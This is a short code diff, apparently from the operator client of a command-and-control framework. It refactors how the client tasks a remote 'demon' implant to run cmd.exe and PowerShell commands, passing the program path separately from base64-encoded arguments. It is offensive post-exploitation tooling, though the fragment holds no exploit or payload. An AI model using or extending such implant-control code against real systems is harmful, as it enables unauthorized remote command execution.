@@ -629,12 +629,13 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
         {
             if ( InputCommands.length() > 1 )
             {
-                auto Args = QString( R"(c:\windows\system32\cmd.exe /c )" + JoinAtIndex( InputCommands, 1 ) ).toUtf8().toBase64(); // InputCommands[ 1 ].;
+                auto Program = QString("c:\\windows\\system32\\cmd.exe");
+                auto Args = QString( "/c " + JoinAtIndex( InputCommands, 1 ) ).toUtf8().toBase64(); // InputCommands[ 1 ].;
 
                 TaskID = CONSOLE_INFO( "Tasked demon to execute a shell command" );
                 CommandInputList[ TaskID ] = commandline;
 
-                SEND( Execute.ProcModule( TaskID, 4, "0;;FALSE;TRUE;" + Args ) )
+                SEND( Execute.ProcModule( TaskID, 4, "0;FALSE;TRUE;" + Program + ";" + Args ) )
             }
             else
             {
@@ -1499,12 +1500,13 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
         {
             if ( InputCommands.length() > 1 )
             {
-                auto Args = QString( R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C )" + JoinAtIndex( InputCommands, 1 ) ).toUtf8().toBase64(); // InputCommands[ 1 ].;
+                auto Program = QString("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
+                auto Args    = QString( "-C " + JoinAtIndex( InputCommands, 1 ) ).toUtf8().toBase64(); // InputCommands[ 1 ].;
 
                 TaskID = CONSOLE_INFO( "Tasked demon to execute a powershell command/script" );
                 CommandInputList[ TaskID ] = commandline;
 
-                SEND( Execute.ProcModule( TaskID, 4, "0;;FALSE;TRUE;" + Args ) )
+                SEND( Execute.ProcModule( TaskID, 4, "0;FALSE;TRUE;" + Program + ";" + Args ) )
             }
             else
             {
